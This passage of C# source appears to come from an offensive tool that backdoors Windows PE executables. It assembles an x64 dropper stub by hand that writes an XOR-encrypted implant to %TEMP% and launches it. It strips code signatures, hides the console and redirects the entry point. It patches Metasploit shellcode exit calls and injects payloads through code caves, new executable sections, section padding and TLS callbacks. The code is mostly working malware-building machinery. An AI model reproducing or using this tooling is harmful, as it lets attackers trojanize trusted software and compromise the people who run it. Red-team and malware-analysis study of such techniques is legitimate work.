        buf.AddRange(new byte[] { 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00 });
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x44, 0x24, 0x20 });
        // arg4 lpSecurityAttributes=NULL: xor r9, r9
        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });
        // arg3 dwShareMode=0: xor r8d, r8d
        buf.AddRange(new byte[] { 0x45, 0x31, 0xC0 });
        // arg2 dwDesiredAccess=GENERIC_WRITE=0x40000000: mov edx, 0x40000000
        buf.AddRange(new byte[] { 0xBA, 0x00, 0x00, 0x00, 0x40 });
        // arg1 lpFileName=&pathBuf: lea rcx, [rsp+0x80]  (frame+0x40; after sub 0x40: rsp+0x80 → disp32)
        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00 });
        // call rax
        buf.AddRange(new byte[] { 0xFF, 0xD0 });
        // add rsp, 0x40
        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x40 });
        // mov [rsp+SLOT_HFILE], rax  (store hFile)
        buf.AddRange(new byte[] { 0x48, 0x89, 0x44, 0x24, SLOT_HFILE });

        // ── [WriteFile(hFile, r13, dplSize, &bw, NULL)] ─────────────────
        // mov rax, [rsp+SLOT_WF]
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_WF });
        // sub rsp, 0x30  (shadow(0x20) + NULL(0x8) + pad(0x8))
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x30 });
        // arg5 lpOverlapped=NULL: xor rcx,rcx; mov [rsp+0x20],rcx
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x20 });
        // arg4 lpBytesWritten=&bw: lea r9, [rsp+0x60]  (frame+0x30; after sub 0x30: rsp+0x60 → disp8)
        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x4C, 0x24, 0x60 });
        // arg3 nNumberOfBytesToWrite=dplSize: mov r8d, dplSize
        buf.AddRange(new byte[] { 0x41, 0xB8 });
        buf.AddRange(BitConverter.GetBytes(dplSize));
        // arg2 lpBuffer=R13 (decrypted .dpl VA): mov rdx, r13
        buf.AddRange(new byte[] { 0x4C, 0x89, 0xEA });
        // arg1 hFile: mov rcx, [rsp+0x58]  (frame+0x28; after sub 0x30: rsp+0x58 → disp8)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x4C, 0x24, 0x58 });
        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax
        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x30 });                   // add rsp, 0x30

        // ── [CloseHandle(hFile)] ─────────────────────────────────────────
        // mov rax, [rsp+SLOT_CH]
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_CH });
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });                   // sub rsp, 0x20
        // mov rcx, [rsp+0x48]  (frame+0x28; after sub 0x20: rsp+0x48)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x4C, 0x24, 0x48 });
        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax
        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x20 });                   // add rsp, 0x20

        // ── [Zero STARTUPINFOW at frame+0x140] ───────────────────────────
        // lea rdi, [rsp+0x140]  (frame+0x140; disp32=0x00000140)
        buf.AddRange(new byte[] { 0x48, 0x8D, 0xBC, 0x24, 0x40, 0x01, 0x00, 0x00 });
        // mov ecx, 13  (13 × 8 = 104 bytes = sizeof STARTUPINFOW + PROCESS_INFORMATION)
        buf.AddRange(new byte[] { 0xB9, 0x0D, 0x00, 0x00, 0x00 });
        // xor rax, rax
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC0 });
        // rep stosq
        buf.AddRange(new byte[] { 0xF3, 0x48, 0xAB });
        // mov dword [rsp+0x140], 0x68  (STARTUPINFOW.cb = sizeof(STARTUPINFOW); disp32)
        buf.AddRange(new byte[] { 0xC7, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00 });

        // ── [CreateProcessW(path, NULL, NULL, NULL, 0, 0, NULL, NULL, &SI, &PI)] ──
        // mov rax, [rsp+SLOT_CPW]
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_CPW });
        // sub rsp, 0x50  (shadow(0x20) + 6 stack args(0x30))
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x50 });
        // xor r11, r11  (zero register for NULL / 0 args)
        buf.AddRange(new byte[] { 0x4D, 0x31, 0xDB });
        // arg10 lpProcessInformation=&PI: lea rcx,[rsp+0x1F8]; mov [rsp+0x48],rcx
        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0xF8, 0x01, 0x00, 0x00 });
        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x48 });
        // arg9  lpStartupInfo=&SI:  lea rcx,[rsp+0x190]; mov [rsp+0x40],rcx
        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x01, 0x00, 0x00 });
        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x40 });
        // arg8 lpCurrentDirectory=NULL: mov [rsp+0x38], r11
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x38 });
        // arg7 lpEnvironment=NULL:    mov [rsp+0x30], r11
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x30 });
        // arg6 dwCreationFlags=0:     mov [rsp+0x28], r11
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x28 });
        // arg5 bInheritHandles=0:     mov [rsp+0x20], r11
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x20 });
        // arg4 lpThreadAttributes=NULL: mov r9, r11
        buf.AddRange(new byte[] { 0x4D, 0x89, 0xD9 });
        // arg3 lpProcessAttributes=NULL: mov r8, r11
        buf.AddRange(new byte[] { 0x4D, 0x89, 0xD8 });
        // arg2 lpCommandLine=NULL:    mov rdx, r11
        buf.AddRange(new byte[] { 0x4C, 0x89, 0xDA });
        // arg1 lpApplicationName=pathBuf: lea rcx,[rsp+0x90]  (frame+0x40 after sub 0x50: disp32)
        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00 });
        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax
        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x50 });                   // add rsp, 0x50

        // ── [Deallocate frame + restore registers] ───────────────────────
        // add rsp, 0x288
        buf.AddRange(new byte[] { 0x48, 0x81, 0xC4, 0x88, 0x02, 0x00, 0x00 });
        buf.AddRange(X64RestoreRegs);

        // ── [JMP OEP placeholder] ────────────────────────────────────────
        buf.Add(0xE9);
        buf.AddRange(new byte[4]);                                              // patched by PatchPayloadJmpOffset

        // ── [Patch remaining offsets] ────────────────────────────────────
        var bytes = buf.ToArray();
        bytes[xorJlPos + 1] = unchecked((byte)(xorLoopPos - (xorJlPos + 2)));

        return bytes;
    }

    // ─────────────────────────────────────────────────────────────────────
    //  BackdoorDropperAsync — orchestrator for Dropper mode
    // ─────────────────────────────────────────────────────────────────────
    private async Task<BackdoorResult> BackdoorDropperAsync(
        PeBackdoorOptions options, byte[] peData, ParsedPe pe, BackdoorResult result)
    {
        // Dropper requires x64 (PIC stub is x64-only).
        if (!pe.Is64Bit)
        {
            result.ErrorMessage = "Dropper mode is only supported for x64 PE files.";
            return result;
        }

        if (string.IsNullOrEmpty(options.ImplantPath) || !File.Exists(options.ImplantPath))
        {
            result.ErrorMessage = $"Implant EXE not found: {options.ImplantPath}";
            return result;
        }

        // Strip signature overlay before modifying sections.
        if (pe.HasSignature && options.RemoveSignature)
        {
            peData = StripSignatureOverlay(peData, pe);
            pe = ParsePe(peData);
            result.Steps.Add($"Stripped signature overlay (file now {peData.Length:N0} bytes)");
        }

        // Read implant and XOR-encrypt it.
        var implantBytes = await File.ReadAllBytesAsync(options.ImplantPath);
        result.Steps.Add($"Loaded implant: {implantBytes.Length:N0} bytes from {Path.GetFileName(options.ImplantPath)}");

        // Choose a non-zero XOR key.
        byte xorKey;
        do { xorKey = (byte)Random.Shared.Next(1, 256); } while (xorKey == 0);
        var encryptedImplant = (byte[])implantBytes.Clone();
        for (int i = 0; i < encryptedImplant.Length; i++)
            encryptedImplant[i] ^= xorKey;
        result.Steps.Add($"XOR-encrypted implant (key=0x{xorKey:X2})");

        // Append .dpl section with encrypted implant.
        uint dplRva, dplSize;
        (peData, dplRva, dplSize) = AppendDplSection(peData, pe, encryptedImplant);
        pe = ParsePe(peData);
        result.Steps.Add($"Appended .dpl section: RVA=0x{dplRva:X}, size={dplSize:N0} bytes");

        // Build PIC dropper stub.
        options.Method = InjectionMethod.NewSection;
        var fullPayload = BuildDropperPayload(dplRva, dplSize, xorKey);
        result.Steps.Add($"Built dropper stub: {fullPayload.Length} bytes");

        // Inject stub as a new +RWX section.
        uint payloadRva;
        (peData, payloadRva) = InjectNewSection(peData, pe, fullPayload, options.NewSectionName, result);
        pe = ParsePe(peData);

        // Patch the trailing E9 JMP to original OEP.
        // The E9 is always the last 5 bytes of the dropper stub.
        int jmpOffset = fullPayload.Length - 5;
        peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffset);
        result.Steps.Add($"Patched resume JMP → original entry point 0x{pe.AddressOfEntryPoint:X}");

        // Redirect entry point to dropper stub.
        peData = PatchEntryPointField(peData, pe, payloadRva);
        result.Steps.Add($"Entry point: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");

        if (options.PatchSubsystemToGui && !pe.IsDll)
        {
            peData = PatchSubsystemInternal(peData, pe);
            result.Steps.Add("Patched subsystem to GUI (hidden console)");
        }

        peData = RecalculateChecksum(peData, pe);
        result.Steps.Add("Recalculated PE checksum");

        // Write output.
        var outputPath = options.OutputPath;
        if (string.IsNullOrEmpty(outputPath))
        {
            var dir  = Path.GetDirectoryName(options.TargetPePath)!;
            var name = Path.GetFileNameWithoutExtension(options.TargetPePath);
            var ext  = Path.GetExtension(options.TargetPePath);
            outputPath = Path.Combine(dir, $"{name}.dropper{ext}");
        }

        var outDir = Path.GetDirectoryName(outputPath);
        if (!string.IsNullOrEmpty(outDir) && !Directory.Exists(outDir))
            Directory.CreateDirectory(outDir);

        await File.WriteAllBytesAsync(outputPath, peData);
        result.OutputPath = outputPath;
        result.Success = true;
        result.Steps.Add($"Output: {outputPath} ({peData.Length:N0} bytes)");
        result.Warnings.Add("Dropper: implant EXE is written to %TEMP%\\~dpl.exe on first execution.");
        _logger.Ok($"Dropper PE written to: {outputPath}");

        return result;
    }

    /// <summary>
    /// Scan shellcode for destructive exit function patterns and patch them to ExitThread.
    /// Handles Metasploit-style ROR13 hash-based API resolution (block_api.asm) and
    /// string-based API resolution (GetProcAddress with function name).
    ///
    /// Three patching strategies:
    ///   1. Exitfunk block: detect GetVersion hash anchor → patch preceding exit hash in mov ebx
    ///   2. Direct API calls: detect mov r10d/edx with destructive hash + call rbp/edi
    ///   3. String-based: replace "ExitProcess\0" → "ExitThread\0\0" (12-byte size-neutral)
    /// </summary>
    private (byte[] patched, int patchCount) PatchShellcodeExitCalls(byte[] shellcode, bool is64Bit)
    {
        var patched = (byte[])shellcode.Clone();
        int patchCount = 0;

        if (is64Bit)
        {
            // ── Strategy 1: Exitfunk block detection (x64) ─────────────
            // Metasploit exitfunk pattern:
            //   BB <exit_hash>         ; mov ebx, EXITFUNK_HASH
            //   41 BA A6 95 BD 9D      ; mov r10d, 0x9DBD95A6 (GetVersion)
            //   FF D5                  ; call rbp
            // Anchor on the GetVersion hash, look back 5 bytes for mov ebx
            byte[] getVersionSig = { 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D };
            for (int i = 5; i <= patched.Length - getVersionSig.Length; i++)
            {
                if (!BytesMatch(patched, i, getVersionSig)) continue;
                if (patched[i - 5] != 0xBB) continue; // no mov ebx preceding

                uint exitHash = BitConverter.ToUInt32(patched, i - 4);
                if (IsDestructiveExitHash(exitHash))
                {
                    string name = NameForHash(exitHash);
                    _logger.Info($"Patching exitfunk: {name} (0x{exitHash:X8}) → ExitThread at offset 0x{(i - 4):X}");
                    BitConverter.GetBytes(MSF_HASH_EXIT_THREAD).CopyTo(patched, i - 4);
                    patchCount++;
                }
            }

            // ── Strategy 2: Direct API hash calls (x64) ───────────────
            // Pattern: 41 BA <hash_LE_4> FF D5  (mov r10d, <hash>; call rbp)
            for (int i = 0; i <= patched.Length - 8; i++)
            {
                if (patched[i] != 0x41 || patched[i + 1] != 0xBA) continue;
                if (patched[i + 6] != 0xFF || patched[i + 7] != 0xD5) continue;

                uint hash = BitConverter.ToUInt32(patched, i + 2);
                if (IsDestructiveExitHash(hash))
                {
                    string name = NameForHash(hash);
                    _logger.Info($"Patching direct call: {name} (0x{hash:X8}) → ExitThread at offset 0x{(i + 2):X}");
                    BitConverter.GetBytes(MSF_HASH_EXIT_THREAD).CopyTo(patched, i + 2);
                    patchCount++;
                }
            }
        }
        else
        {
            // ── x86: hash-based calls via push hash; call esi/edi ──────
            // Pattern: 68 <hash_LE_4> FF D6/FF D7  (push <hash>; call esi/edi)
            for (int i = 0; i <= patched.Length - 7; i++)
            {
                if (patched[i] != 0x68) continue;
                if (patched[i + 5] != 0xFF) continue;
                if (patched[i + 6] != 0xD6 && patched[i + 6] != 0xD7) continue;

                uint hash = BitConverter.ToUInt32(patched, i + 1);
                if (IsDestructiveExitHash(hash))
                {
                    string name = NameForHash(hash);
                    _logger.Info($"Patching x86 call: {name} (0x{hash:X8}) → ExitThread at offset 0x{(i + 1):X}");
                    BitConverter.GetBytes(MSF_HASH_EXIT_THREAD).CopyTo(patched, i + 1);
                    patchCount++;
                }
            }
        }

        // ── Strategy 3: String-based patching (arch-independent) ───────
        byte[] exitProcessStr = Encoding.ASCII.GetBytes("ExitProcess\0");
        byte[] exitThreadStr  = Encoding.ASCII.GetBytes("ExitThread\0\0");
        for (int i = 0; i <= patched.Length - exitProcessStr.Length; i++)
        {
            if (!BytesMatch(patched, i, exitProcessStr)) continue;
            Array.Copy(exitThreadStr, 0, patched, i, exitThreadStr.Length);
            _logger.Info($"Patching string: \"ExitProcess\" → \"ExitThread\" at offset 0x{i:X}");
            patchCount++;
        }

        if (patchCount > 0)
            _logger.Ok($"Applied {patchCount} exit function patch(es) for thread safety");

        return (patched, patchCount);
    }

    private static bool IsDestructiveExitHash(uint hash) =>
        hash == MSF_HASH_EXIT_PROCESS
        || hash == MSF_HASH_SET_UNHANDLED_EXCEPTION_FILTER
        || hash == MSF_HASH_TERMINATE_PROCESS
        || hash == MSF_HASH_NT_TERMINATE_PROCESS
        || hash == MSF_HASH_RTL_EXIT_USER_PROCESS;

    private static string NameForHash(uint hash) => hash switch
    {
        MSF_HASH_EXIT_PROCESS => "ExitProcess",
        MSF_HASH_SET_UNHANDLED_EXCEPTION_FILTER => "SetUnhandledExceptionFilter",
        MSF_HASH_TERMINATE_PROCESS => "TerminateProcess",
        MSF_HASH_NT_TERMINATE_PROCESS => "NtTerminateProcess",
        MSF_HASH_RTL_EXIT_USER_PROCESS => "RtlExitUserProcess",
        _ => $"Unknown(0x{hash:X8})"
    };

    private static bool BytesMatch(byte[] data, int offset, byte[] pattern)
    {
        if (offset + pattern.Length > data.Length) return false;
        for (int j = 0; j < pattern.Length; j++)
        {
            if (data[offset + j] != pattern[j]) return false;
        }
        return true;
    }

    /// <summary>
    /// Build a small XOR decoder stub that decrypts shellcode in-place before execution.
    /// Must be placed right before the CALL instruction.
    /// </summary>
    private byte[] BuildXorDecoderStub(bool is64Bit, int shellcodeLen, byte xorKey)
    {
        if (is64Bit)
        {
            // The shellcode will be located after: decoder + CALL(5) + restore(28) + JMP(5) = decoder + 38
            // But we don't know decoder size yet (chicken-and-egg).
            // Solution: use a fixed-size stub and compute offset at the end.
            // For now we use a simple approach:
            //   lea rsi, [rip + offset]  ; 7 bytes (48 8D 35 XX XX XX XX)
            //   mov ecx, length          ; 5 bytes (B9 XX XX XX XX)
            //   xor_loop:
            //   xor byte [rsi], key      ; 3 bytes (80 36 XX)
            //   inc rsi                  ; 3 bytes (48 FF C6)
            //   dec ecx                  ; 2 bytes (FF C9)
            //   jnz xor_loop            ; 2 bytes (75 F6)
            // Total: 22 bytes
            var buf = new List<byte>();

            // lea rsi, [rip + offset_to_shellcode]
            // offset = (CALL(5) + restore(28) + JMP(5)) = 38 bytes ahead from end of LEA
            int leaOffset = 38 + (22 - 7); // remaining decoder bytes after LEA + call+restore+jmp
            // Actually: from end of LEA instruction (which is 7 bytes into decoder),
            // the shellcode is at: (remaining_decoder_bytes) + CALL(5) + restore(28) + JMP(5) = 15 + 38 = 53
            // remaining decoder after LEA = 22 - 7 = 15
            leaOffset = 15 + 38; // = 53
            buf.AddRange(new byte[] { 0x48, 0x8D, 0x35 });
            buf.AddRange(BitConverter.GetBytes(leaOffset));

            // mov ecx, shellcode_length
            buf.Add(0xB9);
            buf.AddRange(BitConverter.GetBytes(shellcodeLen));

            // xor_loop: xor byte [rsi], key
            buf.AddRange(new byte[] { 0x80, 0x36, xorKey });
            // inc rsi
            buf.AddRange(new byte[] { 0x48, 0xFF, 0xC6 });
            // dec ecx
            buf.AddRange(new byte[] { 0xFF, 0xC9 });
            // jnz xor_loop (-10 = 0xF6)
            buf.AddRange(new byte[] { 0x75, 0xF6 });

            return buf.ToArray();
        }
        else
        {
            // x86 decoder using CALL/POP for PIC
            //   jmp short get_addr    ; EB 09
            //   decode:
            //   pop esi               ; 5E
            //   xor ecx, ecx          ; 31 C9
            //   mov cx, length        ; 66 B9 XX XX
            //   xor_loop:
            //   xor byte [esi], key   ; 80 36 XX
            //   inc esi               ; 46
            //   loop xor_loop         ; E2 FB (-5)
            //   jmp short continue    ; EB XX (skip call)
            //   get_addr:
            //   call decode           ; E8 F2 FF FF FF
            // This is complex. For simplicity, skip x86 decoder for now.
            return Array.Empty<byte>();
        }
    }

    /// <summary>
    /// After placing the payload at a known RVA, patch the JMP at the end to go to the original entry point.
    /// When jmpOffsetHint >= 0, use it directly. Otherwise auto-detect from inline payload layout.
    /// </summary>
    private byte[] PatchPayloadJmpOffset(byte[] peData, ParsedPe pe, int payloadLen, uint payloadRva,
                                          int jmpOffsetHint = -1, uint resumeRva = 0)
    {
        long payloadFileOffset = RvaToFileOffset(payloadRva, pe.Sections);
        int pos;

        if (jmpOffsetHint >= 0)
        {
            // Threaded payload: caller told us exactly where the E9 JMP is
            pos = jmpOffsetHint;
        }
        else
        {
            // Inline payload: calculate from known layout [save][decoder?][CALL][restore][JMP][shellcode]
            bool is64Bit = pe.Is64Bit;
            byte[] save = is64Bit ? X64SaveRegs : X86SaveRegs;
            byte[] restore = is64Bit ? X64RestoreRegs : X86RestoreRegs;

            pos = save.Length;

            // Skip decoder if present (check for LEA RSI opcode for x64: 48 8D 35)
            if (is64Bit && pos + 3 <= payloadLen &&
                peData[payloadFileOffset + pos] == 0x48 &&
                peData[payloadFileOffset + pos + 1] == 0x8D &&
                peData[payloadFileOffset + pos + 2] == 0x35)
            {
                pos += 22; // decoder size
            }

            pos += 5; // CALL instruction
            pos += restore.Length; // restore regs
        }

        // Verify E9 JMP opcode at expected position
        long jmpFileOffset = payloadFileOffset + pos;
        if (peData[jmpFileOffset] != 0xE9)
        {
            _logger.Warn($"Expected E9 (JMP) at payload offset {pos}, got 0x{peData[jmpFileOffset]:X2}");
            // Try to find E9 nearby
            for (int scan = pos - 2; scan <= pos + 2; scan++)
            {
                if (scan >= 0 && scan < payloadLen && peData[payloadFileOffset + scan] == 0xE9)
                {
                    pos = scan;
                    jmpFileOffset = payloadFileOffset + pos;
                    break;
                }
            }
        }

        // Calculate relative offset: target - (jmp_rva + 5)
        uint jmpRva = payloadRva + (uint)pos;
        uint targetRva = resumeRva != 0 ? resumeRva : pe.AddressOfEntryPoint;
        int relOffset = (int)targetRva - (int)(jmpRva + 5);

        var output = peData.ToArray();
        BitConverter.GetBytes(relOffset).CopyTo(output, jmpFileOffset + 1);
        return output;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Injection Methods
    // ═════════════════════════════════════════════════════════════════════

    private (byte[] data, uint payloadRva) InjectCodeCave(byte[] peData, ParsedPe pe,
        byte[] payload, BackdoorResult result)
    {
        var caves = ScanForCaves(peData, pe, payload.Length);
        if (caves.Count == 0)
        {
            throw new InvalidOperationException(
                $"No code cave large enough for {payload.Length} byte payload. " +
                $"Try --method new-section instead.");
        }

        // Pick best cave: prefer executable sections, then largest
        var cave = caves
            .OrderByDescending(c => c.SectionIsExecutable)
            .ThenByDescending(c => c.Size)
            .First();

        _logger.Info($"Selected cave: {cave.SectionName} @ file:0x{cave.FileOffset:X} RVA:0x{cave.Rva:X} ({cave.Size} bytes)");
        result.Steps.Add($"Using code cave: {cave.SectionName} @ RVA 0x{cave.Rva:X} ({cave.Size} bytes, need {payload.Length})");

        var output = peData.ToArray();

        // Write payload into cave
        Array.Copy(payload, 0, output, cave.FileOffset, payload.Length);

        // Make section executable + readable if not already
        var section = pe.Sections[cave.SectionIndex];
        uint requiredFlags = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
        if ((section.Characteristics & requiredFlags) != requiredFlags)
        {
            // Clear DISCARDABLE — loader may unmap discardable sections after init, crashing our code
            uint newChars = (section.Characteristics & ~IMAGE_SCN_MEM_DISCARDABLE) | requiredFlags | IMAGE_SCN_CNT_CODE;
            output = PatchSectionCharacteristics(output, section, newChars);
            result.Steps.Add($"Made {section.Name} section executable (0x{section.Characteristics:X8} → 0x{newChars:X8})");
        }

        return (output, cave.Rva);
    }

    private (byte[] data, uint payloadRva) InjectNewSection(byte[] peData, ParsedPe pe,
        byte[] payload, string sectionName, BackdoorResult result)
    {
        uint fileAlign = pe.FileAlignment;
        uint sectAlign = pe.SectionAlignment;

        // Check if there's room for a new section header
        long newHeaderOffset = pe.SectionHeadersFileOffset + pe.NumberOfSections * 40;
        long headerEnd = newHeaderOffset + 40;
        if (headerEnd > pe.SizeOfHeaders)
        {
            throw new InvalidOperationException(
                $"No room for new section header (headers end at 0x{pe.SizeOfHeaders:X}, " +
                $"need 0x{headerEnd:X}). Try --method code-cave.");
        }

        // Calculate new section layout
        var lastSect = pe.Sections.Last();
        uint newRva = AlignUp(lastSect.VirtualAddress + Math.Max(lastSect.VirtualSize, lastSect.RawSize), sectAlign);
        uint rawSize = AlignUp((uint)payload.Length, fileAlign);
        uint rawOffset = AlignUp(lastSect.RawAddress + lastSect.RawSize, fileAlign);

        // Extend file (must be at least as large as original to preserve overlay/signature data)
        int newFileSize = Math.Max(peData.Length, (int)(rawOffset + rawSize));
        var output = new byte[newFileSize];
        Array.Copy(peData, 0, output, 0, peData.Length);

        // Write payload
        Array.Copy(payload, 0, output, rawOffset, payload.Length);

        // Update NumberOfSections
        ushort newCount = (ushort)(pe.NumberOfSections + 1);
        BitConverter.GetBytes(newCount).CopyTo(output, pe.NumberOfSectionsFileOffset);

        // Update SizeOfImage
        uint newSizeOfImage = AlignUp(newRva + (uint)payload.Length, sectAlign);
        BitConverter.GetBytes(newSizeOfImage).CopyTo(output, pe.SizeOfImageFieldFileOffset);

        // Write section header
        using var ms = new MemoryStream(output);
        ms.Seek(newHeaderOffset, SeekOrigin.Begin);
        using var bw = new BinaryWriter(ms);

        var nameBytes = new byte[8];
        Encoding.ASCII.GetBytes(sectionName, 0, Math.Min(sectionName.Length, 8), nameBytes, 0);
        bw.Write(nameBytes);
        bw.Write((uint)payload.Length);      // VirtualSize
        bw.Write(newRva);                    // VirtualAddress
        bw.Write(rawSize);                   // SizeOfRawData
        bw.Write(rawOffset);                 // PointerToRawData
        bw.Write(0u);                        // PointerToRelocations
        bw.Write(0u);                        // PointerToLinenumbers
        bw.Write((ushort)0);                 // NumberOfRelocations
        bw.Write((ushort)0);                 // NumberOfLinenumbers
        bw.Write(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE);

        result.Steps.Add($"Added section '{sectionName}' at RVA 0x{newRva:X} (raw 0x{rawOffset:X}, {rawSize} bytes)");
        return (ms.ToArray(), newRva);
    }

    private (byte[] data, uint payloadRva) InjectSectionExtension(byte[] peData, ParsedPe pe,
        byte[] payload, BackdoorResult result)
    {
        // Find last section and extend it
        var lastSection = pe.Sections.Last();
        uint fileAlign = pe.FileAlignment;
        uint sectAlign = pe.SectionAlignment;

        uint originalRawEnd = lastSection.RawAddress + lastSection.RawSize;
        uint payloadOffset = originalRawEnd;
        uint newRawSize = AlignUp(lastSection.RawSize + (uint)payload.Length, fileAlign);
        uint newVirtSize = Math.Max(lastSection.VirtualSize, lastSection.RawSize) + (uint)payload.Length;

        // Extend file if needed
        int requiredSize = (int)(lastSection.RawAddress + newRawSize);
        byte[] output;
        if (requiredSize > peData.Length)
        {
            output = new byte[requiredSize];
            Array.Copy(peData, output, peData.Length);
        }
        else
        {
            output = peData.ToArray();
        }

        // Write payload
        Array.Copy(payload, 0, output, payloadOffset, payload.Length);

        // Calculate payload RVA
        uint payloadRva = lastSection.VirtualAddress + lastSection.RawSize;

        // Update section header: VirtualSize and RawSize
        // VirtualSize is at section header + 8, RawSize at + 16
        BitConverter.GetBytes(newVirtSize).CopyTo(output, lastSection.HeaderFileOffset + 8);
        BitConverter.GetBytes(newRawSize).CopyTo(output, lastSection.HeaderFileOffset + 16);

        // Make section executable; clear DISCARDABLE so the loader doesn't unmap it
        uint chars = (lastSection.Characteristics & ~IMAGE_SCN_MEM_DISCARDABLE) | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
        BitConverter.GetBytes(chars).CopyTo(output, lastSection.HeaderFileOffset + 36);

        // Update SizeOfImage
        uint newSizeOfImage = AlignUp(lastSection.VirtualAddress + newVirtSize, sectAlign);
        BitConverter.GetBytes(newSizeOfImage).CopyTo(output, pe.SizeOfImageFieldFileOffset);

        result.Steps.Add($"Extended {lastSection.Name} by {payload.Length} bytes (raw 0x{payloadOffset:X}, RVA 0x{payloadRva:X})");
        return (output, payloadRva);
    }

    private (byte[] data, uint payloadRva) InjectTextSectionPadding(byte[] peData, ParsedPe pe,
        byte[] payload, BackdoorResult result)
    {
        // Find the .text section (primary code section)
        var textSection = pe.Sections.FirstOrDefault(s =>
            s.Name.Equals(".text", StringComparison.OrdinalIgnoreCase))
            ?? pe.Sections.FirstOrDefault(s => s.IsExecutable);

        if (textSection == null)
            throw new InvalidOperationException("No .text or executable section found in the PE");

        // The padding gap is the space between VirtualSize and RawSize (file alignment padding).
        // Compilers often allocate RawSize > VirtualSize due to FileAlignment rounding.
        uint paddingStart = textSection.VirtualSize;
        uint paddingCapacity = textSection.RawSize > textSection.VirtualSize
            ? textSection.RawSize - textSection.VirtualSize
            : 0;

        if (paddingCapacity < (uint)payload.Length)
        {
            throw new InvalidOperationException(
                $"Text section padding too small: {paddingCapacity} bytes available, " +
                $"need {payload.Length}. Try --method new-section or section-ext.");
        }

        // Write payload into the padding area
        uint fileOffset = textSection.RawAddress + paddingStart;
        uint payloadRva = textSection.VirtualAddress + paddingStart;

        var output = peData.ToArray();
        Array.Copy(payload, 0, output, fileOffset, payload.Length);

        // Expand VirtualSize to cover the payload so the loader maps it into memory
        uint newVirtSize = paddingStart + (uint)payload.Length;
        BitConverter.GetBytes(newVirtSize).CopyTo(output, textSection.HeaderFileOffset + 8);

        // Ensure the section is executable + readable (it should be, but be safe)
        uint requiredFlags = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
        if ((textSection.Characteristics & requiredFlags) != requiredFlags)
        {
            uint newChars = (textSection.Characteristics & ~IMAGE_SCN_MEM_DISCARDABLE) | requiredFlags;
            BitConverter.GetBytes(newChars).CopyTo(output, textSection.HeaderFileOffset + 36);
        }

        result.Steps.Add($"Wrote {payload.Length} bytes into {textSection.Name} padding at RVA 0x{payloadRva:X} (gap: {paddingCapacity} bytes)");
        return (output, payloadRva);
    }

    private (byte[] data, uint payloadRva) InjectViaTlsCallback(byte[] peData, ParsedPe pe,
        byte[] payload, string sectionName, BackdoorResult result)
    {
        if (!pe.Is64Bit)
            throw new InvalidOperationException("TLS callback injection is only supported for x64 PE files");

        uint fileAlign = pe.FileAlignment;
        uint sectAlign = pe.SectionAlignment;

        // ── Step 1: Add a new section that holds: [TLS directory] [callback array] [payload]
        long newHeaderOffset = pe.SectionHeadersFileOffset + pe.NumberOfSections * 40;
        long headerEnd = newHeaderOffset + 40;
        if (headerEnd > pe.SizeOfHeaders)
        {
            throw new InvalidOperationException(
                $"No room for new section header (headers end at 0x{pe.SizeOfHeaders:X}, " +
                $"need 0x{headerEnd:X}). Try --method new-section.");
        }

        var lastSect = pe.Sections.Last();
        uint newRva = AlignUp(lastSect.VirtualAddress + Math.Max(lastSect.VirtualSize, lastSect.RawSize), sectAlign);

        // Layout within the new section:
        //   [0x00..0x27]  IMAGE_TLS_DIRECTORY64 (40 bytes)
        //   [0x28..0x37]  Callback array: [ptr_to_payload, NULL] (16 bytes)
        //   [0x38..]      Payload bytes
        const int TLS_DIR_SIZE = 40;
        const int CALLBACK_ARRAY_SIZE = 16; // 2 × 8-byte pointers (callback + null terminator)
        int headerArea = TLS_DIR_SIZE + CALLBACK_ARRAY_SIZE;
        int totalSize = headerArea + payload.Length;

        uint rawSize = AlignUp((uint)totalSize, fileAlign);
